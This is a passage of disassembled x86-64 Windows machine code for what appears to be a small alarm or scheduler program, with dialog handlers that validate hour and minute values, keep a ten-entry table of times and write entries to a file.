  4036ce:	48 89 d9             	mov    %rbx,%rcx
  4036d1:	e8 7a 72 00 00       	call   0x40a950
  4036d6:	83 f8 03             	cmp    $0x3,%eax
  4036d9:	74 15                	je     0x4036f0
  4036db:	48 89 d9             	mov    %rbx,%rcx
  4036de:	e8 75 72 00 00       	call   0x40a958
  4036e3:	90                   	nop
  4036e4:	48 83 c4 60          	add    $0x60,%rsp
  4036e8:	5b                   	pop    %rbx
  4036e9:	5e                   	pop    %rsi
  4036ea:	5f                   	pop    %rdi
  4036eb:	c3                   	ret
  4036ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4036f0:	8b 05 4a c9 15 00    	mov    0x15c94a(%rip),%eax        # 0x560040
  4036f6:	83 f8 09             	cmp    $0x9,%eax
  4036f9:	7f e0                	jg     0x4036db
  4036fb:	48 63 d0             	movslq %eax,%rdx
  4036fe:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
  403702:	83 c0 01             	add    $0x1,%eax
  403705:	48 c1 e2 04          	shl    $0x4,%rdx
  403709:	89 05 31 c9 15 00    	mov    %eax,0x15c931(%rip)        # 0x560040
  40370f:	48 01 fa             	add    %rdi,%rdx
  403712:	89 0a                	mov    %ecx,(%rdx)
  403714:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
  403718:	c7 42 0c 01 00 00 00 	movl   $0x1,0xc(%rdx)
  40371f:	89 4a 04             	mov    %ecx,0x4(%rdx)
  403722:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
  403726:	89 4a 08             	mov    %ecx,0x8(%rdx)
  403729:	eb 8d                	jmp    0x4036b8
  40372b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403730:	57                   	push   %rdi
  403731:	56                   	push   %rsi
  403732:	53                   	push   %rbx
  403733:	48 83 ec 40          	sub    $0x40,%rsp
  403737:	8b 05 03 c9 15 00    	mov    0x15c903(%rip),%eax        # 0x560040
  40373d:	89 cb                	mov    %ecx,%ebx
  40373f:	89 d6                	mov    %edx,%esi
  403741:	83 f8 09             	cmp    $0x9,%eax
  403744:	7e 0a                	jle    0x403750
  403746:	48 83 c4 40          	add    $0x40,%rsp
  40374a:	5b                   	pop    %rbx
  40374b:	5e                   	pop    %rsi
  40374c:	5f                   	pop    %rdi
  40374d:	c3                   	ret
  40374e:	66 90                	xchg   %ax,%ax
  403750:	48 63 d0             	movslq %eax,%rdx
  403753:	4c 8d 15 06 c9 15 00 	lea    0x15c906(%rip),%r10        # 0x560060
  40375a:	83 c0 01             	add    $0x1,%eax
  40375d:	48 c1 e2 04          	shl    $0x4,%rdx
  403761:	89 05 d9 c8 15 00    	mov    %eax,0x15c8d9(%rip)        # 0x560040
  403767:	49 01 d2             	add    %rdx,%r10
  40376a:	48 8d 15 fb 9b 15 00 	lea    0x159bfb(%rip),%rdx        # 0x55d36c
  403771:	41 89 0a             	mov    %ecx,(%r10)
  403774:	48 8d 0d d7 9b 15 00 	lea    0x159bd7(%rip),%rcx        # 0x55d352
  40377b:	45 89 42 08          	mov    %r8d,0x8(%r10)
  40377f:	41 89 72 04          	mov    %esi,0x4(%r10)
  403783:	41 c7 42 0c 01 00 00 	movl   $0x1,0xc(%r10)
  40378a:	00 
  40378b:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
  403790:	e8 b3 71 00 00       	call   0x40a948
  403795:	48 85 c0             	test   %rax,%rax
  403798:	48 89 c7             	mov    %rax,%rdi
  40379b:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
  4037a0:	74 a4                	je     0x403746
  4037a2:	48 8d 15 c5 9b 15 00 	lea    0x159bc5(%rip),%rdx        # 0x55d36e
  4037a9:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  4037ae:	41 89 f1             	mov    %esi,%r9d
  4037b1:	41 89 d8             	mov    %ebx,%r8d
  4037b4:	48 89 c1             	mov    %rax,%rcx
  4037b7:	e8 a4 71 00 00       	call   0x40a960
  4037bc:	48 89 f9             	mov    %rdi,%rcx
  4037bf:	48 83 c4 40          	add    $0x40,%rsp
  4037c3:	5b                   	pop    %rbx
  4037c4:	5e                   	pop    %rsi
  4037c5:	5f                   	pop    %rdi
  4037c6:	e9 8d 71 00 00       	jmp    0x40a958
  4037cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4037d0:	56                   	push   %rsi
  4037d1:	53                   	push   %rbx
  4037d2:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
  4037d9:	8b 05 61 c8 15 00    	mov    0x15c861(%rip),%eax        # 0x560040
  4037df:	31 f6                	xor    %esi,%esi
  4037e1:	48 8d 1d 84 c8 15 00 	lea    0x15c884(%rip),%rbx        # 0x56006c
  4037e8:	85 c0                	test   %eax,%eax
  4037ea:	7f 10                	jg     0x4037fc
  4037ec:	e9 7f 00 00 00       	jmp    0x403870
  4037f1:	83 c6 01             	add    $0x1,%esi
  4037f4:	48 83 c3 10          	add    $0x10,%rbx
  4037f8:	39 c6                	cmp    %eax,%esi
  4037fa:	7d 74                	jge    0x403870
  4037fc:	8b 13                	mov    (%rbx),%edx
  4037fe:	85 d2                	test   %edx,%edx
  403800:	74 ef                	je     0x4037f1
  403802:	44 8b 43 f4          	mov    -0xc(%rbx),%r8d
  403806:	44 3b 05 23 c9 15 00 	cmp    0x15c923(%rip),%r8d        # 0x560130
  40380d:	75 e2                	jne    0x4037f1
  40380f:	44 8b 4b f8          	mov    -0x8(%rbx),%r9d
  403813:	44 3b 0d 06 c9 15 00 	cmp    0x15c906(%rip),%r9d        # 0x560120
  40381a:	75 d5                	jne    0x4037f1
  40381c:	8b 53 fc             	mov    -0x4(%rbx),%edx
  40381f:	3b 15 eb c8 15 00    	cmp    0x15c8eb(%rip),%edx        # 0x560110
  403825:	75 ca                	jne    0x4037f1
  403827:	89 54 24 20          	mov    %edx,0x20(%rsp)
  40382b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  403830:	48 8d 15 98 9a 15 00 	lea    0x159a98(%rip),%rdx        # 0x55d2cf
  403837:	e8 fc 70 00 00       	call   0x40a938
  40383c:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  403842:	4c 8d 05 a2 9a 15 00 	lea    0x159aa2(%rip),%r8        # 0x55d2eb
  403849:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
  40384e:	48 8b 0d eb c8 15 00 	mov    0x15c8eb(%rip),%rcx        # 0x560140
  403855:	4c 8b 15 30 f0 15 00 	mov    0x15f030(%rip),%r10        # 0x56288c
  40385c:	41 ff d2             	call   *%r10
  40385f:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
  403865:	8b 05 d5 c7 15 00    	mov    0x15c7d5(%rip),%eax        # 0x560040
  40386b:	eb 84                	jmp    0x4037f1
  40386d:	0f 1f 00             	nopl   (%rax)
  403870:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
  403877:	5b                   	pop    %rbx
  403878:	5e                   	pop    %rsi
  403879:	c3                   	ret
  40387a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403880:	55                   	push   %rbp
  403881:	57                   	push   %rdi
  403882:	56                   	push   %rsi
  403883:	53                   	push   %rbx
  403884:	48 83 ec 28          	sub    $0x28,%rsp
  403888:	81 fa 10 01 00 00    	cmp    $0x110,%edx
  40388e:	48 89 cb             	mov    %rcx,%rbx
  403891:	74 1d                	je     0x4038b0
  403893:	31 c0                	xor    %eax,%eax
  403895:	81 fa 11 01 00 00    	cmp    $0x111,%edx
  40389b:	74 63                	je     0x403900
  40389d:	48 83 c4 28          	add    $0x28,%rsp
  4038a1:	5b                   	pop    %rbx
  4038a2:	5e                   	pop    %rsi
  4038a3:	5f                   	pop    %rdi
  4038a4:	5d                   	pop    %rbp
  4038a5:	c3                   	ret
  4038a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4038ad:	00 00 00 
  4038b0:	48 8b 35 ed ef 15 00 	mov    0x15efed(%rip),%rsi        # 0x5628a4
  4038b7:	45 31 c9             	xor    %r9d,%r9d
  4038ba:	44 8b 05 6f c8 15 00 	mov    0x15c86f(%rip),%r8d        # 0x560130
  4038c1:	ba e9 03 00 00       	mov    $0x3e9,%edx
  4038c6:	ff d6                	call   *%rsi
  4038c8:	45 31 c9             	xor    %r9d,%r9d
  4038cb:	48 89 d9             	mov    %rbx,%rcx
  4038ce:	44 8b 05 4b c8 15 00 	mov    0x15c84b(%rip),%r8d        # 0x560120
  4038d5:	ba ea 03 00 00       	mov    $0x3ea,%edx
  4038da:	ff d6                	call   *%rsi
  4038dc:	44 8b 05 2d c8 15 00 	mov    0x15c82d(%rip),%r8d        # 0x560110
  4038e3:	45 31 c9             	xor    %r9d,%r9d
  4038e6:	ba eb 03 00 00       	mov    $0x3eb,%edx
  4038eb:	48 89 d9             	mov    %rbx,%rcx
  4038ee:	ff d6                	call   *%rsi
  4038f0:	b8 01 00 00 00       	mov    $0x1,%eax
  4038f5:	48 83 c4 28          	add    $0x28,%rsp
  4038f9:	5b                   	pop    %rbx
  4038fa:	5e                   	pop    %rsi
  4038fb:	5f                   	pop    %rdi
  4038fc:	5d                   	pop    %rbp
  4038fd:	c3                   	ret
  4038fe:	66 90                	xchg   %ax,%ax
  403900:	66 41 83 f8 01       	cmp    $0x1,%r8w
  403905:	74 1e                	je     0x403925
  403907:	31 c0                	xor    %eax,%eax
  403909:	66 41 83 f8 02       	cmp    $0x2,%r8w
  40390e:	75 8d                	jne    0x40389d
  403910:	ba 02 00 00 00       	mov    $0x2,%edx
  403915:	ff 15 09 ef 15 00    	call   *0x15ef09(%rip)        # 0x562824
  40391b:	b8 01 00 00 00       	mov    $0x1,%eax
  403920:	e9 78 ff ff ff       	jmp    0x40389d
  403925:	45 31 c9             	xor    %r9d,%r9d
  403928:	45 31 c0             	xor    %r8d,%r8d
  40392b:	48 8b 35 1a ef 15 00 	mov    0x15ef1a(%rip),%rsi        # 0x56284c
  403932:	ba e9 03 00 00       	mov    $0x3e9,%edx
  403937:	ff d6                	call   *%rsi
  403939:	45 31 c9             	xor    %r9d,%r9d
  40393c:	45 31 c0             	xor    %r8d,%r8d
  40393f:	ba ea 03 00 00       	mov    $0x3ea,%edx
  403944:	48 89 d9             	mov    %rbx,%rcx
  403947:	89 c5                	mov    %eax,%ebp
  403949:	ff d6                	call   *%rsi
  40394b:	89 c7                	mov    %eax,%edi
  40394d:	45 31 c9             	xor    %r9d,%r9d
  403950:	45 31 c0             	xor    %r8d,%r8d
  403953:	ba eb 03 00 00       	mov    $0x3eb,%edx
  403958:	48 89 d9             	mov    %rbx,%rcx
  40395b:	ff d6                	call   *%rsi
  40395d:	85 ff                	test   %edi,%edi
  40395f:	78 16                	js     0x403977
  403961:	83 fd 17             	cmp    $0x17,%ebp
  403964:	77 11                	ja     0x403977
  403966:	85 c0                	test   %eax,%eax
  403968:	78 0d                	js     0x403977
  40396a:	83 ff 3b             	cmp    $0x3b,%edi
  40396d:	0f 1f 00             	nopl   (%rax)
  403970:	7f 05                	jg     0x403977
  403972:	83 f8 3b             	cmp    $0x3b,%eax
  403975:	7e 27                	jle    0x40399e
  403977:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  40397d:	4c 8d 05 f4 99 15 00 	lea    0x1599f4(%rip),%r8        # 0x55d378
  403984:	48 8d 15 f5 99 15 00 	lea    0x1599f5(%rip),%rdx        # 0x55d380
  40398b:	48 89 d9             	mov    %rbx,%rcx
  40398e:	ff 15 f8 ee 15 00    	call   *0x15eef8(%rip)        # 0x56288c
  403994:	b8 01 00 00 00       	mov    $0x1,%eax
  403999:	e9 ff fe ff ff       	jmp    0x40389d
  40399e:	89 2d 8c c7 15 00    	mov    %ebp,0x15c78c(%rip)        # 0x560130
  4039a4:	89 3d 76 c7 15 00    	mov    %edi,0x15c776(%rip)        # 0x560120
  4039aa:	ba 01 00 00 00       	mov    $0x1,%edx
  4039af:	89 05 5b c7 15 00    	mov    %eax,0x15c75b(%rip)        # 0x560110
  4039b5:	48 89 d9             	mov    %rbx,%rcx
  4039b8:	ff 15 66 ee 15 00    	call   *0x15ee66(%rip)        # 0x562824
  4039be:	b8 01 00 00 00       	mov    $0x1,%eax
  4039c3:	e9 d5 fe ff ff       	jmp    0x40389d
  4039c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4039cf:	00 
  4039d0:	41 54                	push   %r12
  4039d2:	55                   	push   %rbp
  4039d3:	57                   	push   %rdi
  4039d4:	56                   	push   %rsi
  4039d5:	53                   	push   %rbx
  4039d6:	48 83 ec 30          	sub    $0x30,%rsp
  4039da:	81 fa 10 01 00 00    	cmp    $0x110,%edx
  4039e0:	48 89 cb             	mov    %rcx,%rbx
  4039e3:	74 1b                	je     0x403a00
  4039e5:	31 c0                	xor    %eax,%eax
  4039e7:	81 fa 11 01 00 00    	cmp    $0x111,%edx
  4039ed:	74 61                	je     0x403a50
  4039ef:	48 83 c4 30          	add    $0x30,%rsp
  4039f3:	5b                   	pop    %rbx
  4039f4:	5e                   	pop    %rsi
  4039f5:	5f                   	pop    %rdi
  4039f6:	5d                   	pop    %rbp
  4039f7:	41 5c                	pop    %r12
  4039f9:	c3                   	ret
  4039fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403a00:	48 8b 35 9d ee 15 00 	mov    0x15ee9d(%rip),%rsi        # 0x5628a4
  403a07:	45 31 c9             	xor    %r9d,%r9d
  403a0a:	44 8b 05 1f c7 15 00 	mov    0x15c71f(%rip),%r8d        # 0x560130
  403a11:	ba e9 03 00 00       	mov    $0x3e9,%edx
  403a16:	ff d6                	call   *%rsi
  403a18:	45 31 c9             	xor    %r9d,%r9d
  403a1b:	48 89 d9             	mov    %rbx,%rcx
  403a1e:	44 8b 05 fb c6 15 00 	mov    0x15c6fb(%rip),%r8d        # 0x560120
  403a25:	ba ea 03 00 00       	mov    $0x3ea,%edx
  403a2a:	ff d6                	call   *%rsi
  403a2c:	45 31 c9             	xor    %r9d,%r9d
  403a2f:	45 31 c0             	xor    %r8d,%r8d
  403a32:	ba eb 03 00 00       	mov    $0x3eb,%edx
  403a37:	48 89 d9             	mov    %rbx,%rcx
  403a3a:	ff d6                	call   *%rsi
  403a3c:	b8 01 00 00 00       	mov    $0x1,%eax
  403a41:	48 83 c4 30          	add    $0x30,%rsp
  403a45:	5b                   	pop    %rbx
  403a46:	5e                   	pop    %rsi
  403a47:	5f                   	pop    %rdi
  403a48:	5d                   	pop    %rbp
  403a49:	41 5c                	pop    %r12
  403a4b:	c3                   	ret
  403a4c:	0f 1f 40 00          	nopl   0x0(%rax)
  403a50:	66 41 83 f8 01       	cmp    $0x1,%r8w
  403a55:	74 1e                	je     0x403a75
  403a57:	31 c0                	xor    %eax,%eax
  403a59:	66 41 83 f8 02       	cmp    $0x2,%r8w
  403a5e:	75 8f                	jne    0x4039ef
  403a60:	ba 02 00 00 00       	mov    $0x2,%edx
  403a65:	ff 15 b9 ed 15 00    	call   *0x15edb9(%rip)        # 0x562824
  403a6b:	b8 01 00 00 00       	mov    $0x1,%eax
  403a70:	e9 7a ff ff ff       	jmp    0x4039ef
  403a75:	48 8b 35 d0 ed 15 00 	mov    0x15edd0(%rip),%rsi        # 0x56284c
  403a7c:	45 31 c9             	xor    %r9d,%r9d
  403a7f:	45 31 c0             	xor    %r8d,%r8d
  403a82:	ba e9 03 00 00       	mov    $0x3e9,%edx
  403a87:	ff d6                	call   *%rsi
  403a89:	45 31 c9             	xor    %r9d,%r9d
  403a8c:	45 31 c0             	xor    %r8d,%r8d
  403a8f:	ba ea 03 00 00       	mov    $0x3ea,%edx
  403a94:	48 89 d9             	mov    %rbx,%rcx
  403a97:	89 c5                	mov    %eax,%ebp
  403a99:	ff d6                	call   *%rsi
  403a9b:	89 c7                	mov    %eax,%edi
  403a9d:	45 31 c9             	xor    %r9d,%r9d
  403aa0:	45 31 c0             	xor    %r8d,%r8d
  403aa3:	ba eb 03 00 00       	mov    $0x3eb,%edx
  403aa8:	48 89 d9             	mov    %rbx,%rcx
  403aab:	ff d6                	call   *%rsi
  403aad:	85 ff                	test   %edi,%edi
  403aaf:	89 c6                	mov    %eax,%esi
  403ab1:	78 14                	js     0x403ac7
  403ab3:	83 fd 17             	cmp    $0x17,%ebp
  403ab6:	77 0f                	ja     0x403ac7
  403ab8:	85 c0                	test   %eax,%eax
  403aba:	78 0b                	js     0x403ac7
  403abc:	83 ff 3b             	cmp    $0x3b,%edi
  403abf:	90                   	nop
  403ac0:	7f 05                	jg     0x403ac7
  403ac2:	83 f8 3b             	cmp    $0x3b,%eax
  403ac5:	7e 27                	jle    0x403aee
  403ac7:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  403acd:	4c 8d 05 a4 98 15 00 	lea    0x1598a4(%rip),%r8        # 0x55d378
  403ad4:	48 8d 15 a5 98 15 00 	lea    0x1598a5(%rip),%rdx        # 0x55d380
  403adb:	48 89 d9             	mov    %rbx,%rcx
  403ade:	ff 15 a8 ed 15 00    	call   *0x15eda8(%rip)        # 0x56288c
  403ae4:	b8 01 00 00 00       	mov    $0x1,%eax
  403ae9:	e9 01 ff ff ff       	jmp    0x4039ef
  403aee:	8b 05 4c c5 15 00    	mov    0x15c54c(%rip),%eax        # 0x560040
  403af4:	83 f8 09             	cmp    $0x9,%eax
  403af7:	7e 35                	jle    0x403b2e
  403af9:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  403aff:	4c 8d 05 ee 97 15 00 	lea    0x1597ee(%rip),%r8        # 0x55d2f4
  403b06:	48 8d 15 a5 98 15 00 	lea    0x1598a5(%rip),%rdx        # 0x55d3b2
  403b0d:	48 89 d9             	mov    %rbx,%rcx
  403b10:	ff 15 76 ed 15 00    	call   *0x15ed76(%rip)        # 0x56288c
  403b16:	ba 01 00 00 00       	mov    $0x1,%edx
  403b1b:	48 89 d9             	mov    %rbx,%rcx
  403b1e:	ff 15 00 ed 15 00    	call   *0x15ed00(%rip)        # 0x562824
  403b24:	b8 01 00 00 00       	mov    $0x1,%eax
  403b29:	e9 c1 fe ff ff       	jmp    0x4039ef
  403b2e:	48 63 d0             	movslq %eax,%rdx
  403b31:	48 8d 0d 28 c5 15 00 	lea    0x15c528(%rip),%rcx        # 0x560060
  403b38:	83 c0 01             	add    $0x1,%eax
  403b3b:	48 c1 e2 04          	shl    $0x4,%rdx
  403b3f:	89 05 fb c4 15 00    	mov    %eax,0x15c4fb(%rip)        # 0x560040
  403b45:	48 01 ca             	add    %rcx,%rdx
  403b48:	48 8d 0d 03 98 15 00 	lea    0x159803(%rip),%rcx        # 0x55d352
  403b4f:	89 2a                	mov    %ebp,(%rdx)
  403b51:	89 7a 04             	mov    %edi,0x4(%rdx)
  403b54:	89 72 08             	mov    %esi,0x8(%rdx)
  403b57:	c7 42 0c 01 00 00 00 	movl   $0x1,0xc(%rdx)
  403b5e:	48 8d 15 07 98 15 00 	lea    0x159807(%rip),%rdx        # 0x55d36c
  403b65:	e8 de 6d 00 00       	call   0x40a948
  403b6a:	48 85 c0             	test   %rax,%rax
  403b6d:	49 89 c4             	mov    %rax,%r12
  403b70:	74 87                	je     0x403af9
  403b72:	48 8d 15 f5 97 15 00 	lea    0x1597f5(%rip),%rdx        # 0x55d36e
  403b79:	89 74 24 20          	mov    %esi,0x20(%rsp)
  403b7d:	41 89 f9             	mov    %edi,%r9d
  403b80:	41 89 e8             	mov    %ebp,%r8d
  403b83:	48 89 c1             	mov    %rax,%rcx
  403b86:	e8 d5 6d 00 00       	call   0x40a960
  403b8b:	4c 89 e1             	mov    %r12,%rcx
  403b8e:	e8 c5 6d 00 00       	call   0x40a958
  403b93:	e9 61 ff ff ff       	jmp    0x403af9
  403b98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  403b9f:	00 
  403ba0:	41 57                	push   %r15
  403ba2:	41 56                	push   %r14
  403ba4:	41 55                	push   %r13
  403ba6:	41 54                	push   %r12
  403ba8:	55                   	push   %rbp
  403ba9:	57                   	push   %rdi
  403baa:	56                   	push   %rsi
  403bab:	53                   	push   %rbx
  403bac:	48 81 ec 68 03 00 00 	sub    $0x368,%rsp
  403bb3:	48 89 cd             	mov    %rcx,%rbp
  403bb6:	48 8d 0d b3 96 15 00 	lea    0x1596b3(%rip),%rcx        # 0x55d270
  403bbd:	45 89 cc             	mov    %r9d,%r12d
  403bc0:	e8 4b 6d 00 00       	call   0x40a910
  403bc5:	e8 f6 da ff ff       	call   0x4016c0
  403bca:	e8 91 dd ff ff       	call   0x401960
  403bcf:	85 c0                	test   %eax,%eax
  403bd1:	0f 85 74 03 00 00    	jne    0x403f4b
  403bd7:	48 8d bc 24 c0 01 00 	lea    0x1c0(%rsp),%rdi
  403bde:	00 
  403bdf:	31 c0                	xor    %eax,%eax
  403be1:	b9 09 00 00 00       	mov    $0x9,%ecx
  403be6:	48 8d 1d 73 98 15 00 	lea    0x159873(%rip),%rbx        # 0x55d460
  403bed:	ba 00 7f 00 00       	mov    $0x7f00,%edx
  403bf2:	48 89 2d 3f c5 15 00 	mov    %rbp,0x15c53f(%rip)        # 0x560138
  403bf9:	f3 48 ab             	rep stos %rax,(%rdi)
  403bfc:	48 8d 05 bd f5 ff ff 	lea    -0xa43(%rip),%rax        # 0x4031c0
  403c03:	48 89 ac 24 d8 01 00 	mov    %rbp,0x1d8(%rsp)
  403c0a:	00 
  403c0b:	48 c7 84 24 f0 01 00 	movq   $0x6,0x1f0(%rsp)
  403c12:	00 06 00 00 00 
  403c17:	48 89 9c 24 00 02 00 	mov    %rbx,0x200(%rsp)
  403c1e:	00 
  403c1f:	48 89 84 24 c8 01 00 	mov    %rax,0x1c8(%rsp)
  403c26:	00 
  403c27:	ff 15 4f ec 15 00    	call   *0x15ec4f(%rip)        # 0x56287c
  403c2d:	31 c9                	xor    %ecx,%ecx
  403c2f:	ba 00 7f 00 00       	mov    $0x7f00,%edx
  403c34:	48 89 84 24 e8 01 00 	mov    %rax,0x1e8(%rsp)
  403c3b:	00 
  403c3c:	ff 15 42 ec 15 00    	call   *0x15ec42(%rip)        # 0x562884
  403c42:	48 8d 8c 24 c0 01 00 	lea    0x1c0(%rsp),%rcx
  403c49:	00 
  403c4a:	48 89 84 24 e0 01 00 	mov    %rax,0x1e0(%rsp)
  403c51:	00 
  403c52:	ff 15 44 ec 15 00    	call   *0x15ec44(%rip)        # 0x56289c
  403c58:	66 85 c0             	test   %ax,%ax
  403c5b:	0f 84 66 02 00 00    	je     0x403ec7
  403c61:	48 8b 1d 9c eb 15 00 	mov    0x15eb9c(%rip),%rbx        # 0x562804
  403c68:	ff d3                	call   *%rbx
  403c6a:	48 89 c7             	mov    %rax,%rdi
  403c6d:	ff d3                	call   *%rbx
  403c6f:	48 89 c6             	mov    %rax,%rsi
  403c72:	48 8b 1d 7b eb 15 00 	mov    0x15eb7b(%rip),%rbx        # 0x5627f4
  403c79:	31 d2                	xor    %edx,%edx
  403c7b:	4c 8d 0d 5a 97 15 00 	lea    0x15975a(%rip),%r9        # 0x55d3dc
  403c82:	41 b8 41 9c 00 00    	mov    $0x9c41,%r8d
  403c88:	48 89 c1             	mov    %rax,%rcx
  403c8b:	ff d3                	call   *%rbx
  403c8d:	31 d2                	xor    %edx,%edx
  403c8f:	4c 8d 0d 57 97 15 00 	lea    0x159757(%rip),%r9        # 0x55d3ed
  403c96:	41 b8 42 9c 00 00    	mov    $0x9c42,%r8d
  403c9c:	48 89 f1             	mov    %rsi,%rcx
  403c9f:	ff d3                	call   *%rbx
  403ca1:	45 31 c9             	xor    %r9d,%r9d
  403ca4:	45 31 c0             	xor    %r8d,%r8d
  403ca7:	ba 00 08 00 00       	mov    $0x800,%edx
  403cac:	48 89 f1             	mov    %rsi,%rcx
  403caf:	ff d3                	call   *%rbx
  403cb1:	31 d2                	xor    %edx,%edx
  403cb3:	4c 8d 0d 44 97 15 00 	lea    0x159744(%rip),%r9        # 0x55d3fe
  403cba:	41 b8 43 9c 00 00    	mov    $0x9c43,%r8d
  403cc0:	48 89 f1             	mov    %rsi,%rcx
  403cc3:	ff d3                	call   *%rbx
  403cc5:	31 d2                	xor    %edx,%edx
  403cc7:	4c 8d 0d 41 97 15 00 	lea    0x159741(%rip),%r9        # 0x55d40f
  403cce:	41 b8 44 9c 00 00    	mov    $0x9c44,%r8d
  403cd4:	48 89 f1             	mov    %rsi,%rcx
  403cd7:	ff d3                	call   *%rbx
  403cd9:	31 d2                	xor    %edx,%edx
  403cdb:	4c 8d 0d 3e 97 15 00 	lea    0x15973e(%rip),%r9        # 0x55d420
  403ce2:	41 b8 45 9c 00 00    	mov    $0x9c45,%r8d
  403ce8:	48 89 f1             	mov    %rsi,%rcx
  403ceb:	ff d3                	call   *%rbx
  403ced:	45 31 c9             	xor    %r9d,%r9d
  403cf0:	45 31 c0             	xor    %r8d,%r8d
  403cf3:	ba 00 08 00 00       	mov    $0x800,%edx
  403cf8:	48 89 f1             	mov    %rsi,%rcx
  403cfb:	ff d3                	call   *%rbx
  403cfd:	31 d2                	xor    %edx,%edx
  403cff:	4c 8d 0d 2b 97 15 00 	lea    0x15972b(%rip),%r9        # 0x55d431
  403d06:	41 b8 46 9c 00 00    	mov    $0x9c46,%r8d
  403d0c:	48 89 f1             	mov    %rsi,%rcx
  403d0f:	ff d3                	call   *%rbx
  403d11:	4c 8d 0d 24 97 15 00 	lea    0x159724(%rip),%r9        # 0x55d43c
  403d18:	49 89 f0             	mov    %rsi,%r8
  403d1b:	ba 10 00 00 00       	mov    $0x10,%edx
  403d20:	48 89 f9             	mov    %rdi,%rcx
  403d23:	ff d3                	call   *%rbx
  403d25:	31 c9                	xor    %ecx,%ecx
  403d27:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
  403d2e:	00 00 
  403d30:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
  403d35:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
  403d3a:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
  403d41:	00 00 
  403d43:	41 b9 00 00 cf 00    	mov    $0xcf0000,%r9d
  403d49:	c7 44 24 38 bc 02 00 	movl   $0x2bc,0x38(%rsp)
  403d50:	00 
  403d51:	c7 44 24 30 84 03 00 	movl   $0x384,0x30(%rsp)
  403d58:	00 
  403d59:	4c 8d 05 e7 96 15 00 	lea    0x1596e7(%rip),%r8        # 0x55d447
  403d60:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
  403d67:	80 
  403d68:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
  403d6f:	80 
  403d70:	48 8d 15 e9 96 15 00 	lea    0x1596e9(%rip),%rdx        # 0x55d460
  403d77:	ff 15 8f ea 15 00    	call   *0x15ea8f(%rip)        # 0x56280c
  403d7d:	48 85 c0             	test   %rax,%rax
  403d80:	48 89 05 b9 c3 15 00 	mov    %rax,0x15c3b9(%rip)        # 0x560140
  403d87:	0f 84 11 08 00 00    	je     0x40459e
  403d8d:	44 89 e2             	mov    %r12d,%edx
  403d90:	48 89 c1             	mov    %rax,%rcx
  403d93:	ff 15 1b eb 15 00    	call   *0x15eb1b(%rip)        # 0x5628b4
  403d99:	48 8b 0d a0 c3 15 00 	mov    0x15c3a0(%rip),%rcx        # 0x560140
  403da0:	ff 15 1e eb 15 00    	call   *0x15eb1e(%rip)        # 0x5628c4
  403da6:	48 8d 8c 24 c0 00 00 	lea    0xc0(%rsp),%rcx
  403dad:	00 
  403dae:	ff 15 b8 e7 15 00    	call   *0x15e7b8(%rip)        # 0x56256c
  403db4:	0f b7 84 24 c8 00 00 	movzwl 0xc8(%rsp),%eax
  403dbb:	00 
  403dbc:	48 8d 15 8d 95 15 00 	lea    0x15958d(%rip),%rdx        # 0x55d350
  403dc3:	48 8d 0d 88 95 15 00 	lea    0x159588(%rip),%rcx        # 0x55d352
  403dca:	89 05 60 c3 15 00    	mov    %eax,0x15c360(%rip)        # 0x560130
  403dd0:	0f b7 84 24 ca 00 00 	movzwl 0xca(%rsp),%eax
  403dd7:	00 
  403dd8:	89 05 42 c3 15 00    	mov    %eax,0x15c342(%rip)        # 0x560120
  403dde:	0f b7 84 24 cc 00 00 	movzwl 0xcc(%rsp),%eax
  403de5:	00 
  403de6:	89 05 24 c3 15 00    	mov    %eax,0x15c324(%rip)        # 0x560110
  403dec:	0f b7 84 24 c0 00 00 	movzwl 0xc0(%rsp),%eax
  403df3:	00 
  403df4:	89 05 36 73 00 00    	mov    %eax,0x7336(%rip)        # 0x40b130
  403dfa:	0f b7 84 24 c2 00 00 	movzwl 0xc2(%rsp),%eax
  403e01:	00 
  403e02:	89 05 18 73 00 00    	mov    %eax,0x7318(%rip)        # 0x40b120
  403e08:	0f b7 84 24 c6 00 00 	movzwl 0xc6(%rsp),%eax
  403e0f:	00 
  403e10:	89 05 fa 72 00 00    	mov    %eax,0x72fa(%rip)        # 0x40b110
  403e16:	e8 2d 6b 00 00       	call   0x40a948
  403e1b:	48 85 c0             	test   %rax,%rax
  403e1e:	48 89 c3             	mov    %rax,%rbx
  403e21:	74 4b                	je     0x403e6e
  403e23:	48 8d bc 24 90 00 00 	lea    0x90(%rsp),%rdi
  403e2a:	00 
  403e2b:	48 8d 35 2e c2 15 00 	lea    0x15c22e(%rip),%rsi        # 0x560060
  403e32:	c7 05 04 c2 15 00 00 	movl   $0x0,0x15c204(%rip)        # 0x560040
  403e39:	00 00 00 
  403e3c:	4c 8d 8c 24 80 00 00 	lea    0x80(%rsp),%r9
  403e43:	00 
  403e44:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  403e49:	48 8d 15 13 95 15 00 	lea    0x159513(%rip),%rdx        # 0x55d363
